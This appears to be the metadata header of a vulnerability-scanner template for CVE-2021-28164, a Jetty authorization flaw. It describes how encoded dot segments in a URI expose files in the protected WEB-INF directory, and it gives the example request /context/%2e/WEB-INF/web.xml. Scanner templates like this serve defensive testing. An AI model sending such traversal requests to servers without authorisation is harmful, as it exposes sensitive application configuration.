id: CVE-2021-28164

info:
  name: Jetty Authorization Before Parsing and Canonicalization
  author: noamrathaus
  severity: medium
  description: |
    The default compliance mode allows requests with URIs that contain %2e or %2e%2e segments to access protected resources within the WEB-INF directory. For example a request to /context/%2e/WEB-INF/web.xml can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.
